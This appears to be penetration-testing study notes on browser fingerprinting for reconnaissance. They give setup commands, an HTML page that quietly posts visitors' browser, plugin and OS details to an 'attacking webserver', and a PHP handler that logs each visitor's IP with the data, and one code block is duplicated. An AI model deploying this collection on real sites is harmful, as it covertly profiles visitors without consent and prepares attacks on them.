

JS library which can be used to gather all information about clients visiting a site it's utilized in.    

```bash
cd /var/www/html  
mkdir fp  
  
sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/2.1.4.zip  
sudo unzip 2.1.4.zip  
sudo mv fingerprintjs-2.1.4/ fp/  
  
cd fp  
vim index.html
```


Info should reveal browser User Agent string, its localization, the installed browser plugins & relabive version, generic info regarding the underlying OS platform, and other details.  
  
  
**Ex index.html:**  
```html
<!doctype html>  
<html>  
<head>  
  <title>Fingerprintjs2 test</title>  
</head>  
<body>  
  <h1>Insert whatever you want shown on the site</h1>  
  
  <p>Your browser fingerprint: <strong id="fp"></strong></p>  
  <p><code id="time"/></p>  
  <p><span id="details"/></p>  
    
  <script src="fingerprint2.js"></script>  
  <script>  
var d1 = new Date();  
var options = {};  
        
Fingerprint2.get(options, function (components) {  
var values = components.map(function (component) { return component.value })  
var murmur = Fingerprint2.x64hash128(values.join(''), 31)  
var clientfp = "Client browser fingerprint: " + murmur + "\n\n";  
var d2 = new Date();  
var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";  
var details = "<strong>Detailed information: </strong><br />";  
  
if(typeof window.console !== "undefined") {  
for (var index in components) {  
var obj = components[index];  
var value = obj.value;  
  
if (value !== null) {  
var line = obj.key + " = " + value.toString().substr(0, 150);  
details += line + "\n";  
}  
}  
}  
//document.querySelector("#details").innerHTML = details   
//document.querySelector("#fp").textContent = murmur   
//document.querySelector("#time").textContent = timeString  
  
var xmlhttp = new XMLHttpRequest();  
xmlhttp.open("POST", "/fp/js.php");  
xmlhttp.setRequestHeader("Content-Type", "application/txt");  
xmlhttp.send(clientfp + timeString + details);  
});  
  </script>  
</body>  
</html>
```

```html
<!doctype html>  
<html>  
<head>  
  <title>Fingerprintjs2 test</title>  
</head>  
<body>  
  <h1>Insert whatever you want shown on the site</h1>  
  
  <p>Your browser fingerprint: <strong id="fp"></strong></p>  
  <p><code id="time"/></p>  
  <p><span id="details"/></p>  
    
  <script src="fingerprint2.js"></script>  
  <script>  
var d1 = new Date();  
var options = {};  
        
Fingerprint2.get(options, function (components) {  
var values = components.map(function (component) { return component.value })  
var murmur = Fingerprint2.x64hash128(values.join(''), 31)  
var clientfp = "Client browser fingerprint: " + murmur + "\n\n";  
var d2 = new Date();  
var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";  
var details = "<strong>Detailed information: </strong><br />";  
  
if(typeof window.console !== "undefined") {  
for (var index in components) {  
var obj = components[index];  
var value = obj.value;  
  
if (value !== null) {  
var line = obj.key + " = " + value.toString().substr(0, 150);  
details += line + "\n";  
}  
}  
}  
//document.querySelector("#details").innerHTML = details   
//document.querySelector("#fp").textContent = murmur   
//document.querySelector("#time").textContent = timeString  
  
var xmlhttp = new XMLHttpRequest();  
xmlhttp.open("POST", "/fp/js.php");  
xmlhttp.setRequestHeader("Content-Type", "application/txt");  
xmlhttp.send(clientfp + timeString + details);  
});  
  </script>  
</body>  
</html>
```
 - Line 18: Invokes the _Fingerprint2.get_ static function to start the process  
 - Line 19: _Components_ variable returned by the library is an array containing all the info extracted from the client  
 - Line 20: ^ data is passed to the _murmur_ hash function in order to create a hash fingerprint of the browser  
 - Line 21: Added Ajax which will transer the extracted info to our attacking webserver.  
 - Lines 37-39: Values are displayed within the page to the client..... hence commented out.  
 - Lines 41-44: Use _XMLHttpRequest_ JS API to send the extracted data to the attacking web server via a POST request.  
	 - Issued against the same server where the malicious web page is stored.  
		 - Hence why the _xmlhttp.open_ method doesn't specify an IP  
  

**Ex PHP code which processes the POST request from above (Lines 41-44):**  
```php
<?php  
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";  
$data .= file_get_contents('php://input');  
$data .= "---------------------------------\n\n";  
file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);  
?>
```
 - Line 2: First extracts the client IP from the _$_SERVER_ array (contains server & execution environment info)  
 - Line 5: Concats the IP to the text string received from the JS POST request & written to the **fingerprint.txt** file in the **/var/www/html/fp** dir  
 - Use of _FILE_APPEND_ flag allows storing of multiple fingerprints to the same file.  
  
  
In order for this to work, Apache _www-data_ user needs to be able to write to the **fp** dir:  
```bash
sudo chown www-data:www-data fp
```